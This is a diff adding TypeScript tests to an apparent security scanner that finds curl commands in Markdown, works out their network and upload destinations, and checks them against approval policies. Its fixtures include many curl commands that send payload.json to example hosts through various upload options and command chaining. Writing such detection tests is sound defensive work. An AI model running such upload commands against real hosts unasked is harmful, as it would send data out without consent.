@@ -3389,6 +3389,11 @@ const CURL_BOUNDARY_CASES = [
     upload: [],
   },
   {
+    line: "curl https://read.example.com & curl --data @payload.json https://write.example.com",
+    network: ["read.example.com", "write.example.com"],
+    upload: ["write.example.com"],
+  },
+  {
     line: "curl https://read.example.com ; curl --upload-file payload.json https://write.example.com",
     network: ["read.example.com", "write.example.com"],
     upload: ["write.example.com"],
@@ -3507,6 +3512,430 @@ ${instruction}
       ).length,
       expected.upload.length,
       expected.line,
+    );
+  }
+});
+
+const MULTILINE_CURL_UPLOAD_OPTIONS = [
+  "-d @payload.json",
+  "--data @payload.json",
+  "--data-binary @payload.json",
+  "-F file=@payload.json",
+  "--form file=@payload.json",
+  "-T payload.json",
+  "--upload-file payload.json",
+  "-X POST",
+  "-X PUT",
+] as const;
+
+function continuedShell(...lines: string[]): string {
+  return lines.join(" " + "\\" + "\n  ");
+}
+
+test("backslash-continued curl options associate in either order", () => {
+  const destination = "https://sink.example.com/upload";
+
+  for (const option of MULTILINE_CURL_UPLOAD_OPTIONS) {
+    for (const instruction of [
+      continuedShell(`curl ${destination}`, option),
+      continuedShell(`curl ${option}`, destination),
+    ]) {
+      assert.deepEqual(
+        associatedNetworkDestinations(instruction).map(
+          (candidate) => candidate.host,
+        ),
+        ["sink.example.com"],
+        instruction,
+      );
+      assert.deepEqual(
+        associatedUploadDestinations(instruction).map(
+          (candidate) => candidate.host,
+        ),
+        ["sink.example.com"],
+        instruction,
+      );
+    }
+  }
+});
+
+const MULTILINE_CURL_BOUNDARY_CASES = [
+  {
+    line: continuedShell(
+      "curl https://read.example.com",
+      "&& curl --data @payload.json",
+      "https://write.example.com",
+    ),
+    network: ["read.example.com", "write.example.com"],
+    upload: ["write.example.com"],
+  },
+  {
+    line: continuedShell(
+      "curl https://read.example.com",
+      "|| curl -X POST",
+      "https://write.example.com",
+    ),
+    network: ["read.example.com", "write.example.com"],
+    upload: ["write.example.com"],
+  },
+  {
+    line: continuedShell("curl https://read.example.com", "| grep --data"),
+    network: ["read.example.com"],
+    upload: [],
+  },
+  {
+    line: continuedShell(
+      "curl https://read.example.com",
+      "; curl --upload-file payload.json",
+      "https://write.example.com",
+    ),
+    network: ["read.example.com", "write.example.com"],
+    upload: ["write.example.com"],
+  },
+  {
+    line: continuedShell(
+      "curl https://read.example.com",
+      "& curl --data @payload.json",
+      "https://write.example.com",
+    ),
+    network: ["read.example.com", "write.example.com"],
+    upload: ["write.example.com"],
+  },
+  {
+    line: continuedShell(
+      "curl https://read.example.com",
+      "--next --data @payload.json",
+      "https://write.example.com",
+    ),
+    network: ["read.example.com", "write.example.com"],
+    upload: ["write.example.com"],
+  },
+  {
+    line: continuedShell(
+      "curl https://one.example.com",
+      "https://two.example.com",
+      "--data @payload.json",
+    ),
+    network: ["one.example.com", "two.example.com"],
+    upload: ["one.example.com", "two.example.com"],
+  },
+  {
+    line: continuedShell(
+      "curl --data @payload.json https://one.example.com",
+      "--next https://read.example.com",
+      "--next -X PUT https://two.example.com",
+    ),
+    network: ["one.example.com", "read.example.com", "two.example.com"],
+    upload: ["one.example.com", "two.example.com"],
+  },
+  {
+    line: continuedShell(
+      "curl https://read.example.com",
+      "& curl --data @payload.json https://write.example.com",
+      "https://write.example.com",
+    ),
+    network: ["read.example.com", "write.example.com"],
+    upload: ["write.example.com"],
+  },
+] as const;
+
+test("logical curl commands apply command and transfer boundaries in order", () => {
+  for (const expected of MULTILINE_CURL_BOUNDARY_CASES) {
+    assert.deepEqual(
+      associatedNetworkDestinations(expected.line).map(
+        (destination) => destination.host,
+      ),
+      expected.network,
+      expected.line,
+    );
+    assert.deepEqual(
+      associatedUploadDestinations(expected.line).map(
+        (destination) => destination.host,
+      ),
+      expected.upload,
+      expected.line,
+    );
+  }
+});
+
+const MULTILINE_CURL_NON_BOUNDARY_CASES = [
+  continuedShell(
+    "curl https://sink.example.com/upload &> output.log",
+    "--data @payload.json",
+  ),
+  continuedShell(
+    "curl https://sink.example.com/upload 2>&1",
+    "--data @payload.json",
+  ),
+  continuedShell(
+    String.raw`curl https://sink.example.com/upload \&`,
+    "--data @payload.json",
+  ),
+  continuedShell(
+    'curl https://sink.example.com/upload "&"',
+    "--data @payload.json",
+  ),
+  continuedShell(
+    "curl https://sink.example.com/upload 'a&b'",
+    "--data @payload.json",
+  ),
+  continuedShell(
+    'curl https://sink.example.com/upload "--next"',
+    "--data @payload.json",
+  ),
+  continuedShell(
+    String.raw`curl https://sink.example.com/upload \--next`,
+    "--data @payload.json",
+  ),
+  continuedShell(
+    'curl https://sink.example.com/upload "|"',
+    "--data @payload.json",
+  ),
+  continuedShell(
+    String.raw`curl https://sink.example.com/upload \|`,
+    "--data @payload.json",
+  ),
+] as const;
+
+test("ampersand redirections and quoted or escaped tokens are not boundaries", () => {
+  for (const instruction of MULTILINE_CURL_NON_BOUNDARY_CASES) {
+    assert.deepEqual(
+      associatedUploadDestinations(instruction).map(
+        (destination) => destination.host,
+      ),
+      ["sink.example.com"],
+      instruction,
+    );
+  }
+});
+
+test("multiline curl findings use complete bounded logical-command evidence", () => {
+  const findingsFor = (
+    instruction: string,
+    networkAllowlist = "approved.example.com",
+    uploadAllowlist = "approved.example.com",
+  ) =>
+    securityDiagnosticFindings([
+      v2SecurityArtifact(`---
+allowed_data: public
+network_allowed: true
+approved_network_destinations: ${networkAllowlist}
+external_upload_allowed: true
+approved_upload_destinations: ${uploadAllowlist}
+requires_human_approval: true
+---
+
+## Commands
+
+\`\`\`bash
+${instruction}
+\`\`\`
+
+Unrelated prose must stay outside the evidence.
+`),
+    ]);
+
+  for (const option of MULTILINE_CURL_UPLOAD_OPTIONS) {
+    for (const instruction of [
+      continuedShell("curl https://sink.example.com/upload", option),
+      continuedShell(`curl ${option}`, "https://sink.example.com/upload"),
+    ]) {
+      const findings = findingsFor(instruction);
+      for (const id of [
+        "SEC-UNAPPROVED-NETWORK-DESTINATION",
+        "SEC-UNAPPROVED-UPLOAD-DESTINATION",
+        "SEC-MISSING-HUMAN-APPROVAL-GUARD",
+        "SEC-EXTERNAL-UPLOAD-INSTRUCTION",
+      ]) {
+        const matching = findings.filter((finding) => finding.id === id);
+        assert.equal(matching.length, 1, `${id}: ${instruction}`);
+        const evidence = matching[0]?.evidence;
+        assert.ok(evidence);
+        assert.equal(evidence.endLine, evidence.startLine + 1, instruction);
+        assert.match(evidence.snippet, /curl/);
+        assert.match(evidence.snippet, /sink\.example\.com/);
+        assert.doesNotMatch(evidence.snippet, /Unrelated prose/);
+      }
+    }
+  }
+
+  for (const expected of MULTILINE_CURL_BOUNDARY_CASES) {
+    const approved = findingsFor(
+      expected.line,
+      expected.network.join(", "),
+      expected.upload.length > 0
+        ? expected.upload.join(", ")
+        : "approved.example.com",
+    );
+    assert.equal(
+      approved.filter(
+        (finding) => finding.id === "SEC-UNAPPROVED-NETWORK-DESTINATION",
+      ).length,
+      0,
+      expected.line,
+    );
+    assert.equal(
+      approved.filter(
+        (finding) => finding.id === "SEC-UNAPPROVED-UPLOAD-DESTINATION",
+      ).length,
+      0,
+      expected.line,
+    );
+    const uploadAdvisories = approved.filter(
+      (finding) => finding.id === "SEC-EXTERNAL-UPLOAD-INSTRUCTION",
+    );
+    assert.equal(uploadAdvisories.length, expected.upload.length > 0 ? 1 : 0);
+    if (expected.upload.length > 0) {
+      const evidence = uploadAdvisories[0]?.evidence;
+      assert.ok(evidence);
+      assert.equal(
+        evidence.endLine - evidence.startLine + 1,
+        expected.line.split("\n").length,
+        expected.line,
+      );
+      assert.equal(evidence.snippet, expected.line, expected.line);
+    }
+
+    const unapproved = findingsFor(expected.line, expected.network.join(", "));
+    assert.equal(
+      unapproved.filter(
+        (finding) => finding.id === "SEC-UNAPPROVED-UPLOAD-DESTINATION",
+      ).length,
+      expected.upload.length,
+      expected.line,
+    );
+  }
+
+  for (const instruction of MULTILINE_CURL_NON_BOUNDARY_CASES) {
+    const findings = findingsFor(instruction, "sink.example.com");
+    assert.equal(
+      findings.filter(
+        (finding) => finding.id === "SEC-UNAPPROVED-UPLOAD-DESTINATION",
+      ).length,
+      1,
+      instruction,
+    );
+  }
+});
+
+test("multiline curl policy denials and approvals preserve destination scope", () => {
+  const instruction = continuedShell(
+    "curl https://sink.example.com/upload",
+    "--data-binary @payload.json",
+  );
+  const denied = securityDiagnosticFindings([
+    v2SecurityArtifact(`---
+allowed_data: public
+network_allowed: false
+external_upload_allowed: false
+requires_human_approval: true
+---
+
+\`\`\`bash
+${instruction}
+\`\`\`
+`),
+  ]);
+  for (const id of [
+    "SEC-INSTRUCTION-VIOLATES-POLICY",
+    "SEC-MISSING-HUMAN-APPROVAL-GUARD",
+    "SEC-EXTERNAL-UPLOAD-INSTRUCTION",
+  ]) {
+    assert.equal(denied.filter((finding) => finding.id === id).length, 1, id);
+  }
+
+  const approved = securityDiagnosticFindings([
+    v2SecurityArtifact(`---
+allowed_data: public
+network_allowed: true
+approved_network_destinations: sink.example.com
+external_upload_allowed: true
+approved_upload_destinations: sink.example.com
+requires_human_approval: false
+---
+
+\`\`\`bash
+${instruction}
+\`\`\`
+`),
+  ]);
+  for (const id of [
+    "SEC-INSTRUCTION-VIOLATES-POLICY",
+    "SEC-UNAPPROVED-NETWORK-DESTINATION",
+    "SEC-UNAPPROVED-UPLOAD-DESTINATION",
+    "SEC-MISSING-HUMAN-APPROVAL-GUARD",
+  ]) {
+    assert.equal(
+      approved.some((finding) => finding.id === id),
+      false,
+      id,
+    );
+  }
+  assert.equal(
+    approved.filter(
+      (finding) => finding.id === "SEC-EXTERNAL-UPLOAD-INSTRUCTION",
+    ).length,
+    1,
+  );
+
+  const readOnly = securityDiagnosticFindings([
+    v2SecurityArtifact(`---
+allowed_data: public
+network_allowed: true
+approved_network_destinations: sink.example.com
+external_upload_allowed: true
+approved_upload_destinations: sink.example.com
+---
+
+\`\`\`bash
+${continuedShell("curl https://sink.example.com/data", "--silent")}
+\`\`\`
+`),
+  ]);
+  assert.equal(
+    readOnly.some(
+      (finding) => finding.id === "SEC-EXTERNAL-UPLOAD-INSTRUCTION",
+    ),
+    false,
+  );
+});
+
+test("logical curl commands do not cross Markdown or hidden-content boundaries", () => {
+  const cases = [
+    `\`\`\`bash
+curl https://sink.example.com/upload \\
+\`\`\`
+--data @payload.json`,
+    `- curl https://sink.example.com/upload \\
+- --data @payload.json`,
+    `curl https://sink.example.com/upload \\
+<!-- hidden --> --data @payload.json`,
+    `Explain curl https://sink.example.com/upload in ordinary prose \\
+--data @payload.json`,
+    "curl https://sink.example.com/upload " + "\\\\" + "\n--data @payload.json",
+    "curl https://sink.example.com/upload " + "\\" + " \n--data @payload.json",
+  ];
+
+  for (const content of cases) {
+    const findings = securityDiagnosticFindings([
+      v2SecurityArtifact(`---
+allowed_data: public
+network_allowed: true
+approved_network_destinations: sink.example.com
+external_upload_allowed: true
+approved_upload_destinations: approved.example.com
+---
+
+${content}
+`),
+    ]);
+    assert.equal(
+      findings.some(
+        (finding) =>
+          finding.id === "SEC-UNAPPROVED-UPLOAD-DESTINATION" ||
+          finding.id === "SEC-EXTERNAL-UPLOAD-INSTRUCTION",
+      ),
+      false,
+      content,
     );
   }
 });
